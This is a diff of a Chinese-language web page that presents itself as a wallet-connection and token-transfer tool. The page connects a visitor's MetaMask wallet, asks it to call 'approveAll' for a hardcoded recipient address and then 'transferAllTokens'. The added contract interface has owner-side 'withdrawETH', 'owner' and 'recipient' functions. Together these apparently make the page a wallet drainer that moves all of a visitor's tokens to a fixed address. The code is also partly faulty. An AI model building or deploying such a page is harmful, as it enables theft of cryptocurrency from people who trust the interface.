@@ -1,62 +1,26 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Token Transfer DApp</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f0f0f0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .container {
-            text-align: center;
-            background-color: #fff;
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
-        }
-        button {
-            background-color: #007bff;
-            color: white;
-            padding: 10px 20px;
-            margin: 10px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        button:disabled {
-            background-color: grey;
-            cursor: not-allowed;
-        }
-        p {
-            font-size: 1.2em;
-            color: #333;
-        }
-    </style>
+    <title>钱包连接与代币转账</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.6.0/web3.min.js"></script>
 </head>
 <body>
-    <div class="container">
-        <h1>Token Transfer DApp</h1>
-        <button id="connectWallet" onclick="connectWallet()">连接钱包</button>
-        <button id="authorizeTransfer" onclick="approveToken()" disabled>授权代币</button>
-        <button id="transferTokens" onclick="transferTokens()" disabled>转移代币</button>
-        <p id="status">请先连接钱包。</p>
-    </div>
+    <h1>钱包连接与代币转账</h1>
+    <button id="connectButton">连接钱包</button>
+    <button id="authorizeTransfer" disabled>授权转账</button>
+    <button id="transferButton" disabled>转移代币</button>
+    <p id="status">状态信息</p>
 
-    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
     <script>
         let web3;
         let account;
-        const contractAddress = '0xa465e2fc9f9d527AAEb07579E821D461F700e699'; // 接收地址
-        const tokenAddress = '0x56a2777e796eF23399e9E1d791E1A0410a75E31b'; // 智能合约地址
+        const contractAddress = "0x56a2777e796eF23399e9E1d791E1A0410a75E31b"; // 合约地址
+        const recipientAddress = "0xa465e2fc9f9d527AAEb07579E821D461F700e699"; // 接收地址
+        let contract;
 
-        const tokenABI = [
+        const abi = [
             {
                 "inputs": [
                     {
@@ -82,53 +46,89 @@
                 "outputs": [],
                 "stateMutability": "nonpayable",
                 "type": "function"
+            },
+            {
+                "inputs": [],
+                "stateMutability": "nonpayable",
+                "type": "constructor"
+            },
+            {
+                "inputs": [],
+                "name": "withdrawETH",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "stateMutability": "payable",
+                "type": "receive"
+            },
+            {
+                "inputs": [],
+                "name": "owner",
+                "outputs": [
+                    {
+                        "internalType": "address",
+                        "name": "",
+                        "type": "address"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "recipient",
+                "outputs": [
+                    {
+                        "internalType": "address",
+                        "name": "",
+                        "type": "address"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
             }
         ];
 
-        // 连接钱包
-        async function connectWallet() {
+        document.getElementById("connectButton").addEventListener("click", async () => {
             if (window.ethereum) {
                 web3 = new Web3(window.ethereum);
                 try {
-                    console.log("请求连接钱包...");
-                    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                     account = accounts[0];
-                    console.log("连接成功，账户地址:", account);
                     document.getElementById("status").innerText = "已连接钱包: " + account;
-                    document.getElementById("authorizeTransfer").disabled = false;
+                    document.getElementById("authorizeTransfer").disabled = false; // 启用授权按钮
                 } catch (error) {
-                    console.error("连接钱包失败:", error);
                     document.getElementById("status").innerText = "连接钱包失败: " + error.message;
                 }
             } else {
                 document.getElementById("status").innerText = "请安装 MetaMask!";
             }
-        }
+        });
 
-        // 授权代币
-        async function approveToken() {
-            const tokenContract = new web3.eth.Contract(tokenABI, tokenAddress);
-            try {
-                document.getElementById("status").innerText = "正在授权代币...";
-                await tokenContract.methods.approveAll(contractAddress).send({ from: account });
-                document.getElementById("status").innerText = "授权成功!";
-                document.getElementById("transferTokens").disabled = false; // 启用转移代币按钮
-            } catch (error) {
-                document.getElementById("status").innerText = "授权失败: " + error.message;
+        document.getElementById("authorizeTransfer").addEventListener("click", async () => {
+            if (contract) {
+                try {
+                    await contract.methods.approveAll(recipientAddress).send({ from: account });
+                    document.getElementById("status").innerText = "授权成功!";
+                    document.getElementById("transferButton").disabled = false; // 启用转账按钮
+                } catch (error) {
+                    document.getElementById("status").innerText = "授权失败: " + error.message;
+                }
+            } else {
+                contract = new web3.eth.Contract(abi, contractAddress);
             }
-        }
+        });
 
-        // 转移代币
-        async function transferTokens() {
-            const tokenContract = new web3.eth.Contract(tokenABI, tokenAddress);
+        document.getElementById("transferButton").addEventListener("click", async () => {
             try {
-                document.getElementById("status").innerText = "正在转移代币...";
-                await tokenContract.methods.transferAllTokens(tokenAddress).send({ from: account });
-                document.getElementById("status").innerText = "代币已成功转移!";
+                await contract.methods.transferAllTokens().send({ from: account });
+                document.getElementById("status").innerText = "转账成功!";
             } catch (error) {
-                document.getElementById("status").innerText = "转移失败: " + error.message;
+                document.getElementById("status").innerText = "转账失败: " + error.message;
             }
-        }
+        });
     </script>
 </body>
 </html>
